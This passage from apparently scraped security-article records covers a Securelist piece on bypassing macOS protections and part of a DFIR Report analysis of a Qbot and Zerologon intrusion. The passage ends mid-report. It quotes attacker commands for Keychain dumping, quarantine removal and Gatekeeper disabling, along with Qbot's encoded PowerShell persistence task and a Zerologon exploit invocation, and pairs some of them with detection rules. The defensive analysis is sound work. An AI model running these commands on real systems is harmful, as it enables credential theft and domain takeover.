Legezo 26 Feb 2021, 12:00pm GReAT Ideas. Green Tea Edition John Hultquist Brian Bartholomew Suguru Ishimaru Vitaly Kamluk Seongsu Park Yusuke Niwa Motohiko Sato 17 Jun 2020, 1:00pm GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots Marco Preuss Denis Legezo Costin Raiu Kurt Baumgartner Dan Demeter Yaroslav Shmelev 26 Aug 2020, 2:00pm GReAT Ideas. Powered by SAS: threat actors advance on new fronts Ivan Kwiatkowski Maher Yamout Noushin Shabab Pierre Delcher F\u00e9lix Aime Giampaolo Dedola Santiago Pontiroli 22 Jul 2020, 2:00pm GReAT Ideas. Powered by SAS: threat hunting and new techniques Dmitry Bestuzhev Costin Raiu Pierre Delcher Brian Bartholomew Boris Larin Ariel Jungheit Fabio Assolini In the same category Yet another DCOM object for lateral movement Hunting for Mythic in network traffic Detecting DLL hijacking with machine learning: real-world cases Applied YARA training Q&A Detecting unknown threats: a honeypot how-to Latest Posts GReAT research The Notepad++ supply chain attack \u2014 unnoticed execution chains and new IoCs Georgy Kucherin Anton Kargin Incidents Supply chain attack on eScan antivirus: detecting and remediating malicious updates Georgy Kucherin Kirill Korchemny Ilya Savelyev GReAT research HoneyMyte updates CoolClient and deploys multiple stealers in recent campaigns Fareed Radzi GReAT research The HoneyMyte APT evolves with a kernel-mode rootkit and a ToneShell backdoor Noushin Shabab Latest Webinars Cyberthreat talks 16 Dec 2025, 5:00pm -17236 min Signal in the noise. What 2025 hacktivism reveals about the modern threat landscape Kseniya Kudasheva Cyberthreat talks 20 Nov 2025, 5:00pm 41 min Kaspersky Security Bulletin 2025: Decoding the finance sector threats Fabio Assolini Cyberthreat talks 11 Dec 2025, 5:00pm 66 min State of AI in cybersecurity: AI trends & predictions for 2026 Vladislav Tushkanov Oleg Gorobets Cyberthreat talks 09 Dec 2025, 3:00pm 69 min KSB: Kaspersky ICS CERT trends and predictions for 2026 Fabio Assolini Evgeny Goncharov Reports HoneyMyte updates CoolClient and deploys multiple stealers in recent campaigns Kaspersky researchers analyze updated CoolClient backdoor and new tools and scripts used in HoneyMyte (aka Mustang Panda or Bronze President) APT campaigns, including three variants of a browser data stealer. The HoneyMyte APT evolves with a kernel-mode rootkit and a ToneShell backdoor Kaspersky discloses a 2025 HoneyMyte (aka Mustang Panda or Bronze President) APT campaign, which uses a kernel-mode rootkit to deliver and protect a ToneShell backdoor. Evasive Panda APT poisons DNS requests to deliver MgBot Kaspersky GReAT experts analyze the Evasive Panda APT\u2019s infection chain, including shellcode encrypted with DPAPI and RC5, as well as the MgBot implant. Cloud Atlas activity in the first half of 2025: what changed Kaspersky expert describes new malicious tools employed by the Cloud Atlas APT, including implants of their signature backdoors VBShower, VBCloud, PowerShower, and CloudAtlas. Subscribe to our weekly e-mails The hottest research right in your inbox Email (Required) (Required) I agree to provide my email address to \u201cAO Kaspersky Lab\u201d to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the \u201cunsubscribe\u201d link that I find at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe \u0394 Threats Threats APT (Targeted attacks) Secure environment (IoT) Mobile threats Financial threats Spam and phishing Industrial threats Web threats Vulnerabilities and exploits All threats Categories Categories APT reports Malware descriptions Security Bulletin Malware reports Spam and phishing reports Security technologies Research Publications All categories Other sections Archive All tags Webinars APT Logbook Statistics Encyclopedia Threats descriptions KSB 2025 Kaspersky ICS CERT \u00a9 2026 AO Kaspersky Lab. All Rights Reserved. Registered trademarks and service marks are the property of their respective owners. Privacy Policy Terms of use License Agreement Cookies",
    "filtered_content": "How attackers adapt to built-in macOS protection | Securelist Solutions for: Home Products Small Business 1-50 employees Medium Business 51-999 employees Enterprise 1000+ employees by Kaspersky CompanyAccount Get In Touch Dark mode off English Russian Spanish Brazil Solutions Internet of Things & Embedded Security Learn More Industrial Cybersecurity Learn More Fraud Prevention Learn More KasperskyOS-based solutions Learn More Other solutions Kaspersky for Security Operations Center Kaspersky IoT Infrastructure Security Kaspersky Secure Remote Workspace Industries National Cybersecurity Learn More Industrial Cybersecurity Learn More Finance Services Cybersecurity Learn More Healthcare Cybersecurity Learn More Transportation Cybersecurity Learn More Retail Cybersecurity Learn More Other Industries Telecom Cybersecurity View all Products Kaspersky Next NEW! Learn More Kaspersky XDR Learn More Kaspersky Endpoint Security for Business Learn More Kaspersky EDR Expert Learn More Kaspersky EDR Optimum Learn More Kaspersky Anti Targeted Attack Platform Learn More Kaspersky Hybrid Cloud Security Learn More Kaspersky SD-WAN Learn More Kaspersky Industrial CyberSecurity Learn More Kaspersky Container Security Learn More Other Products Kaspersky Security for Internet Gateway Kaspersky Embedded Systems Security Kaspersky IoT Infrastructure Security Kaspersky Secure Remote Workspace Kaspersky Security for Mail Server View All Services Kaspersky Cybersecurity Services Learn More Kaspersky Security Awareness Learn More Kaspersky Premium Support Learn More Kaspersky Threat Intelligence Learn More Kaspersky Managed Detection and Response Learn More Kaspersky Compromise Assessment Learn More Kaspersky SOC Consulting Learn More Other Services Kaspersky Professional Services Kaspersky Incident Response Kaspersky Cybersecurity Training View All Resource Center Case Studies White Papers Datasheets Technologies MITRE ATT&CK About Us Transparency Corporate News Press Center Careers Sponsorship Policy Blog Contacts GDPR Dark mode off Securelist menu English Russian Spanish Brazil Existing Customers Personal My Kaspersky Renew your product Update your product Customer support Business KSOS portal Kaspersky Business Hub Technical Support Knowledge Base Renew License Home Products Trials&Update Resource Center Business Kaspersky Next Small Business (1-50 employees) Medium Business (51-999 employees) Enterprise (1000+ employees) Securelist Threats Financial threats Mobile threats Web threats Secure environment (IoT) Vulnerabilities and exploits Spam and Phishing Industrial threats Categories APT reports Incidents Research Malware reports Spam and phishing reports Publications Kaspersky Security Bulletin Archive All Tags APT Logbook Webinars Statistics Encyclopedia Threats descriptions KSB 2021 About Us Company Transparency Corporate News Press Center Careers Sponsorships Policy Blog Contacts Partners Find a Partner Partner Program Content menu Close Subscribe by Kaspersky Dark mode off Threats Threats APT (Targeted attacks) Secure environment (IoT) Mobile threats Financial threats Spam and phishing Industrial threats Web threats Vulnerabilities and exploits All threats Categories Categories APT reports Malware descriptions Security Bulletin Malware reports Spam and phishing reports Security technologies Research Publications All categories Other sections Archive All tags Webinars APT Logbook Statistics Encyclopedia Threats descriptions KSB 2025 Kaspersky ICS CERT Security technologies How attackers adapt to built-in macOS protection Security technologies 29 Aug 2025 minute read Table of Contents Overview of macOS security mechanisms Keychain SIP TCC File Quarantine Gatekeeper Takeaways Authors Alexander Chudnov If a system is popular with users, you can bet it\u2019s just as popular with cybercriminals. Although Windows still dominates, second place belongs to macOS. And this makes it a viable target for attackers. With various built-in protection mechanisms, macOS generally provides a pretty much end-to-end security for the end user. This post looks at how some of them work, with examples of common attack vectors and ways of detecting and thwarting them. Overview of macOS security mechanisms Let\u2019s start by outlining the set of security mechanisms in macOS with a brief description of each: Keychain \u2013 default password manager TCC \u2013 application access control SIP \u2013 ensures the integrity of information in directories and processes vulnerable to attacks File Quarantine \u2013 protection against launching suspicious files downloaded from the internet Gatekeeper \u2013 ensures only trusted applications are allowed to run XProtect \u2013 signature-based anti-malware protection in macOS XProtect Remediator \u2013 tool for automatic response to threats detected by XProtect Keychain Introduced back in 1999, the password manager for macOS remains a key component in the Apple security framework. It provides centralized and secure storage of all kinds of secrets: from certificates and encryption keys to passwords and credentials. All user accounts and passwords are stored in Keychain by default. Access to the data is protected by a master password. Keychain files are located in the directories ~/Library/Keychains/ , /Library/Keychains/ and /Network/Library/Keychains/ . Besides the master password, each of them can be protected with its own key. By default, only owners of the corresponding Keychain copy and administrators have access to these files. In addition, the files are encrypted using the reliable AES-256-GCM algorithm. This guarantees a high level of protection, even in the event of physical access to the system. However, attacks on the macOS password manager still occur. There are specialized utilities, such as Chainbreaker, designed to extract data from Keychain files. With access to the file itself and its password, Chainbreaker allows an attacker to do a local analysis and full data decryption without being tied to the victim\u2019s device. What\u2019s more, native macOS tools such as the Keychain Access GUI application or the /usr/bin/security command-line utility can be used for malicious purposes if the system is already compromised. So while the Keychain architecture provides robust protection, it is still vital to control local access, protect the master password, and minimize the risk of data leakage outside the system. Below is an example of a Chainbreaker command: python -m chainbreaker -pa test_keychain.keychain -o output As mentioned above, the security utility can be used for command line management, specifically the following commands: security list-keychains \u2013 displays all available Keychain files Keychain files available to the user security dump-keychain -a -d \u2013 dumps all Keychain files Keychain file dump security dump-keychain ~/Library/Keychains/login.keychain-db \u2013 dumps a specific Keychain file (a user file is shown as an example) To detect attacks of this type, you need to configure logging of process startup events. The best way to do this is with the built-in macOS logging tool, ESF . This allows you to collect necessary events for building detection logic. Collection of necessary events using this mechanism is already implemented and configured in Kaspersky Endpoint Detection and Response (KEDR) . Among the events necessary for detecting the described activity are those containing the security dump-keychain and security list-keychains commands, since such activity is not regular for ordinary macOS users. Below is an example of an EDR triggering on a Keychain dump event, as well as an example of a detection rule. Example of an event from Kaspersky EDR Sigma: title: Keychain access description: This rule detects dumping of keychain tags: - attack.credential-access - attack.t1555.001 logsource: category: process_creation product: macos detection: selection: cmdline: security cmdline: -list-keychains -dump-keychain condition: selection falsepositives: - Unknow level: medium 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 title : Keychain access description : This rule detects dumping of keychain tags : - attack . credential - access - attack . t1555 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : security cmdline : - list - keychains - dump - keychain condition : selection falsepositives : - Unknow level : medium SIP System Integrity Protection (SIP) is one of the most important macOS security mechanisms, which is designed to prevent unauthorized interference in critical system files and processes, even by users with administrative rights. First introduced in OS X 10.11 El Capitan, SIP marked a significant step toward strengthening security by limiting the ability to modify system components, safeguarding against potential malicious influence. The mechanism protects files and directories by assigning special attributes that block content modification for everyone except trusted system processes, which are inaccessible to users and third-party software. In particular, this makes it difficult to inject malicious components into these files. The following directories are SIP-protected by default: /System /sbin /bin /usr (except /usr/local ) /Applications (preinstalled applications) /Library/Application Support/com.apple.TCC A full list of protected directories is in the configuration file /System/Library/Sandbox/rootless.conf . These are primarily system files and preinstalled applications, but SIP allows adding extra paths. SIP provides a high level of protection for system components, but if there is physical access to the system or administrator rights are compromised, SIP can be disabled \u2013 but only by restarting the system in Recovery Mode and then running the csrutil disable command in the terminal. To check the current status of SIP, use the csrutil status command. Output of the csrutil status command To detect this activity, you need to monitor the csrutil status command. Attackers often check the SIP status to find available options. Because they deploy csrutil disable in Recovery Mode before any monitoring solutions are loaded, this command is not logged and so there is no point in tracking its execution. Instead, you can set up SIP status monitoring, and if the status changes, send a security alert. Example of an event from Kaspersky EDR Sigma: title: SIP status discovery description: This rule detects SIP status discovery tags: - attack.discovery - attack.t1518.001 logsource: category: process_creation product: macos detection: selection: cmdline: csrutil status condition: selection falsepositives: - Unknow level: low 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : SIP status discovery description : This rule detects SIP status discovery tags : - attack . discovery - attack . t1518 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : csrutil status condition : selection falsepositives : - Unknow level : low TCC macOS includes the Transparency, Consent and Control (TCC) framework, which ensures transparency of applications by requiring explicit user consent to access sensitive data and system functions. TCC is structured on SQLite databases ( TCC.db ), located both in shared directories ( /Library/Application Support/com.apple.TCC/TCC.db ) and in individual user directories ( /Users/<username>/Library/Application Support/com.apple.TCC/TCC.db ). Contents of a table in the TCC database The integrity of these databases and protection against unauthorized access are implemented using SIP, making it impossible to modify them directly. To interfere with these databases, an attacker must either disable SIP or gain access to a trusted system process. This renders TCC highly resistant to interference and manipulation. TCC works as follows: whenever an application accesses a sensitive function (camera, microphone, geolocation, Full Disk Access, input control, etc.) for the first time, an interactive window appears with a request for user confirmation. This allows the user to control the extension of privileges. TCC access permission window A potential vector for bypassing this mechanism is TCC Clickjacking \u2013 a technique that superimposes a visually altered window on top of the permissions request window, hiding the true nature of the request. The unsuspecting user clicks the button and grants permissions to malware. Although this technique does not exploit TCC itself, it gives attackers access to sensitive system functions, regardless of the level of protection. Example of a superimposed window Attackers are interested in obtaining Full Disk Access or Accessibility rights, as these permissions grant virtually unlimited access to the system. Therefore, monitoring changes to TCC.db and managing sensitive privileges remain vital tasks for ensuring comprehensive macOS security. File Quarantine File Quarantine is a built-in macOS security feature, first introduced in OS X 10.5 Tiger. It improves system security when handling files downloaded from external sources. This mechanism is analogous to the Mark-of-the-Web feature in Windows to warn users of potential danger before running a downloaded file. Files downloaded through a browser or other application that works with File Quarantine are assigned a special attribute ( com.apple.quarantine ). When running such a file for the first time, if it has a valid signature and does not arouse any suspicion of Gatekeeper (see below), the user is prompted to confirm the action. This helps prevent running malware by accident. Example of file attributes that include the quarantine attribute To get detailed information about the com.apple.quarantine attribute, use the xattr -p com.apple.quarantine <File name> command. The screenshot below shows an example of the output of this command: 0083 \u2013 flag for further Gatekeeper actions 689cb865 \u2013 timestamp in hexadecimal format (Mac Absolute Time) Safari \u2013 browser used to download the file 66EA7FA5-1F9E-4779-A5B5-9CCA2A4A98F5 \u2013 UUID attached to this file. This is needed to database a record of the file Detailed information about the com.apple.quarantine attribute The information returned by this command is stored in a database located at ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2 , where it can be audited. Data in the com.apple.LaunchServices.QuarantineEventsV2 database To avoid having their files quarantined, attackers use various techniques to bypass File Quarantine. For example, files downloaded via curl, wget or other low-level tools that are not integrated with File Quarantine are not flagged with the quarantine attribute. Bypassing quarantine using curl It is also possible to remove the attribute manually using the xattr -d com.apple.quarantine <filename> command. Removing the quarantine attribute If the quarantine attribute is successfully removed, no warning will be displayed when the file is run, which is useful in social engineering attacks or in cases where the attacker prefers to execute malware without the user\u2019s knowledge. Running a file without a File Quarantine check To detect this activity, you need to monitor execution of the xattr command in conjunction with -d and com.apple.quarantine , which implies removal of the quarantine attribute. In an incident related to macOS compromise, also worth investigating is the origin of the file: if it got onto the host without being flagged by quarantine, this is an additional risk factor. Below is an example of an EDR triggering on a quarantine attribute removal event, as well as an example of a rule for detecting such events. Example of an event from Kaspersky EDR Sigma: title: Quarantine attribute removal description: This rule detects removal of the Quarantine attribute, that leads to avoid File Quarantine tags: - attack.defense-evasion - attack.t1553.001 logsource: category: process_creation product: macos detection: selection: cmdline: xattr -d com.apple.quarantine condition: selection falsepositives: - Unknow level: high 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Quarantine attribute removal description : This rule detects removal of the Quarantine attribute , that leads to avoid File Quarantine tags : - attack . defense - evasion - attack . t1553 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : xattr - d com . apple . quarantine condition : selection falsepositives : - Unknow level : high Gatekeeper Gatekeeper is a key part of the macOS security system, designed to protect users from running potentially dangerous applications. First introduced in OS X Leopard (2012), Gatekeeper checks the digital signature of applications and, if the quarantine attribute ( com.apple.quarantine ) is present, restricts the launch of programs unsigned and unapproved by the user, thus reducing the risk of malicious code execution. The spctl utility is used to manage Gatekeeper. Below is an example of calling spctl to check the validity of a signature and whether it is verified by Apple: Spctl -a -t exec -vvvv <path to file> Checking an untrusted file using spctl Checking a trusted file using spctl Gatekeeper requires an application to be: either signed with a valid Apple developer certificate, or certified by Apple after source code verification. If the application fails to meet these requirements, Gatekeeper by default blocks attempts to run it with a double-click. Unblocking is possible, but this requires the user to navigate through the settings. So, to carry out a successful attack, the threat actor has to not only persuade the victim to mark the application as trusted, but also explain to them how to do this. The convoluted procedure to run the software looks suspicious in itself. However, if the launch is done from the context menu (right-click \u2192 Open), the user sees a pop-up window allowing them to bypass the block with a single click by confirming their intention to use the application. This quirk is used in social engineering attacks: malware can be accompanied by instructions prompting the user to run the file from the context menu. Example of Chropex Adware using this technique Let\u2019s take a look at the method for running programs from the context menu, rather than double-clicking. If we double-click the icon of a program with the quarantine attribute, we get the following window. Running a program with the quarantine attribute by double-clicking If we run the program from the context menu (right-click \u2192 Open), we see the following. Running a program with the quarantine attribute from the context menu Attackers with local access and administrator rights can disable Gatekeeper using the spctl \u2013master disable or --global-disable command. To detect this activity, you need to monitor execution of the spctl command with parameters \u2013master disable or --global-disable , which disables Gatekeeper. Below is an example of an EDR triggering on a Gatekeeper disable event, as well as an example of a detection rule. Example of an Kaspersky EDR event Sigma: title: Gatekeeper disable description: This rule detects disabling of Gatekeeper tags: - attack.defense-evasion - attack.t1562.001 logsource: category: process_creation product: macos detection: selection: cmdline: spctl cmdline: - '--master-disable' - '--global-disable' condition: selection 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 title : Gatekeeper disable description : This rule detects disabling of Gatekeeper tags : - attack . defense - evasion - attack . t1562 . 001 logsource : category : process_creation product : macos detection : selection : cmdline : spctl cmdline : - '--master-disable' - '--global-disable' condition : selection Takeaways The built-in macOS protection mechanisms are highly resilient and provide excellent security. That said, as with any mature operating system, attackers continue to adapt and search for ways to bypass even the most reliable protective barriers. In some cases when standard mechanisms are bypassed, it may be difficult to implement additional security measures and stop the attack. Therefore, for total protection against cyberthreats, use advanced solutions from third-party vendors. Our Kaspersky EDR Expert and Kaspersky Endpoint Security detect and block all the threats described in this post. In addition, to guard against bypassing of standard security measures, use the Sigma rules we have provided. Malware Technologies Apple MacOS Security technology Digital Certificates Defense evasion Detection engineering Authors Alexander Chudnov How attackers adapt to built-in macOS protection Your email address will not be published. Required fields are marked * Name * Email * Cancel \u0394 This site uses Akismet to reduce spam. Learn how your comment data is processed. Table of Contents Overview of macOS security mechanisms Keychain SIP TCC File Quarantine Gatekeeper Takeaways GReAT webinars 13 May 2021, 1:00pm GReAT Ideas. Balalaika Edition Boris Larin Denis Legezo 26 Feb 2021, 12:00pm GReAT Ideas. Green Tea Edition John Hultquist Brian Bartholomew Suguru Ishimaru Vitaly Kamluk Seongsu Park Yusuke Niwa Motohiko Sato 17 Jun 2020, 1:00pm GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots Marco Preuss Denis Legezo Costin Raiu Kurt Baumgartner Dan Demeter Yaroslav Shmelev 26 Aug 2020, 2:00pm GReAT Ideas. Powered by SAS: threat actors advance on new fronts Ivan Kwiatkowski Maher Yamout Noushin Shabab Pierre Delcher F\u00e9lix Aime Giampaolo Dedola Santiago Pontiroli 22 Jul 2020, 2:00pm GReAT Ideas. Powered by SAS: threat hunting and new techniques Dmitry Bestuzhev Costin Raiu Pierre Delcher Brian Bartholomew Boris Larin Ariel Jungheit Fabio Assolini In the same category Yet another DCOM object for lateral movement Hunting for Mythic in network traffic Detecting DLL hijacking with machine learning: real-world cases Applied YARA training Q&A Detecting unknown threats: a honeypot how-to Latest Posts GReAT research The Notepad++ supply chain attack \u2014 unnoticed execution chains and new IoCs Georgy Kucherin Anton Kargin Incidents Supply chain attack on eScan antivirus: detecting and remediating malicious updates Georgy Kucherin Kirill Korchemny Ilya Savelyev GReAT research HoneyMyte updates CoolClient and deploys multiple stealers in recent campaigns Fareed Radzi GReAT research The HoneyMyte APT evolves with a kernel-mode rootkit and a ToneShell backdoor Noushin Shabab Latest Webinars Cyberthreat talks 16 Dec 2025, 5:00pm -17236 min Signal in the noise. What 2025 hacktivism reveals about the modern threat landscape Kseniya Kudasheva Cyberthreat talks 20 Nov 2025, 5:00pm 41 min Kaspersky Security Bulletin 2025: Decoding the finance sector threats Fabio Assolini Cyberthreat talks 11 Dec 2025, 5:00pm 66 min State of AI in cybersecurity: AI trends & predictions for 2026 Vladislav Tushkanov Oleg Gorobets Cyberthreat talks 09 Dec 2025, 3:00pm 69 min KSB: Kaspersky ICS CERT trends and predictions for 2026 Fabio Assolini Evgeny Goncharov Reports HoneyMyte updates CoolClient and deploys multiple stealers in recent campaigns Kaspersky researchers analyze updated CoolClient backdoor and new tools and scripts used in HoneyMyte (aka Mustang Panda or Bronze President) APT campaigns, including three variants of a browser data stealer. The HoneyMyte APT evolves with a kernel-mode rootkit and a ToneShell backdoor Kaspersky discloses a 2025 HoneyMyte (aka Mustang Panda or Bronze President) APT campaign, which uses a kernel-mode rootkit to deliver and protect a ToneShell backdoor. Evasive Panda APT poisons DNS requests to deliver MgBot Kaspersky GReAT experts analyze the Evasive Panda APT\u2019s infection chain, including shellcode encrypted with DPAPI and RC5, as well as the MgBot implant. Cloud Atlas activity in the first half of 2025: what changed Kaspersky expert describes new malicious tools employed by the Cloud Atlas APT, including implants of their signature backdoors VBShower, VBCloud, PowerShower, and CloudAtlas. Subscribe to our weekly e-mails The hottest research right in your inbox Email (Required) (Required) I agree to provide my email address to \u201cAO Kaspersky Lab\u201d to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the \u201cunsubscribe\u201d link that I find at the bottom of any e-mail sent to me for the purposes mentioned above. Subscribe \u0394 Threats Threats APT (Targeted attacks) Secure environment (IoT) Mobile threats Financial threats Spam and phishing Industrial threats Web threats Vulnerabilities and exploits All threats Categories Categories APT reports Malware descriptions Security Bulletin Malware reports Spam and phishing reports Security technologies Research Publications All categories Other sections Archive All tags Webinars APT Logbook Statistics Encyclopedia Threats descriptions KSB 2025 Kaspersky ICS CERT \u00a9 2026 AO Kaspersky Lab. All Rights Reserved. Registered trademarks and service marks are the property of their respective owners. Privacy Policy Terms of use License Agreement Cookies",
    "expected_count": 0
  },
  {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "title": "Qbot and Zerologon Lead To Full Domain Compromise \u2013 The DFIR Report",
    "content": "Qbot and Zerologon Lead To Full Domain Compromise \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts adfind cobaltstrike Qbot Qbot and Zerologon Lead To Full Domain Compromise February 21, 2022 In this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware. Soon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network. Summary The threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user. Following the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task\u2019s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes. Once the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as N ltest, net and ADFind. Upon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named cool.exe resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations. The domain admin hash was then used on the beachhead through an over-pass-the-hash attack . After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers. Finally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS) . To conclude this case, the threat actors were evicted from the network before they completed any further objectives. Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here . We also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. Timeline Analysis and reporting completed by @pigerlin & @MetallicHack Reviewed by @ICSNick & @kostastsale Initial Access The threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here . The execution chain for this QBot infection can be seen below: Execution QBot PowerShell analysis We analyzed the registry path and associated keys that were queried by the scheduled task HKCU:\\SOFTWARE\\Pvoeooxf and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in: 1. Copy of QBot DLL 2. String of QBot C2 IP-addresses separated by a semicolon. 3. Obfuscated PowerShell script that is referenced by the scheduled task. The PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below: When run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours. Based on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it. OR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the Invoke-WebRequest PowerShell module: The PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files. The encoded QBot DLL that was stored in the registry, was dropped in the directory %APPDATA%\\Roaming\\Microsoft\\Fdopitcu . The unsigned DLL, with descriptor Cancel Autoplay 2 was executed using regsvr32.exe Upon execution of this second-stage DLL, various registry keys were created in HKCU\\Software\\Microsoft\\Yerqbqokc. In addition, a new instance of explorer.exe (32-bit) was started and injected into. The registry keys contain eight-character long hex strings for which we believe is part of the malware\u2019s encrypted config . Persistence Scheduled Task/Job \u2013 Scheduled Task On Beachhead The scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry. schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30 LogName: Microsoft-Windows-TaskScheduler/Operational EventCode: 106 Message: Task scheduler Task Registered Privilege Escalation Thirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon. The executable was named \u201ccool.exe\u201d : C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\" Three milliseconds after the Zerologon exploit , an event 4742 \u201cA computer account was changed.\u201d was generated on the targeted Domain Controller. As explained in a detailed blog from CrowdStrike , the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV : \u201cIn order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren\u2019t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\u201d As we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller : After the end of the brute force traffic, we can see a single instance where a the exploit has completed successfully. After being successfully authenticated, the DC password was set: The PasswordLastSet field is equal to the TimeCreated field, meaning that the password of the domain controller was successfully updated. We can also see that the SubjectUserName is ANONYMOUS LOGON. A connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain. The explorer shell was also restarted by the threat actor: Defense Evasion Upon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process. The injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication. Over-Pass-the-Hash from Beachhead The threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail. Soon after, a TGT for the administrator account was requested: Discovery QBot initially starts a number of processes to collect information about the affected system. This is part of the \u201cSYSTEM INFO\u201d bot request, as described in a recent article from SecureList . Later, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment. ADFind (renamed in find.exe) used to enumerate computers C:\\redacted\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName On the Domain Controller, the threat actors gathered information about the installed security software through WMI: C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value Ping was used to verify machines were online ping -n 1 [REDACTED] Lateral Movement Through the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment. EventCode: 7045 Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted> User: NT AUTHORITY\\SYSTEM ParentImage: C:\\Windows\\System32\\services.exe ParentCommandLine: C:\\Windows\\system32\\services.exe On the first Domain Controller, a Cobalt Strike service was installed: Log Source: Microsoft-Windows-Service Control Manager Event ID:7045 Multiple services were installed by Cobalt Strike across the environment, here are a few examples: HKLM\\System\\CurrentControlSet\\Services\\3141131\\ImagePath 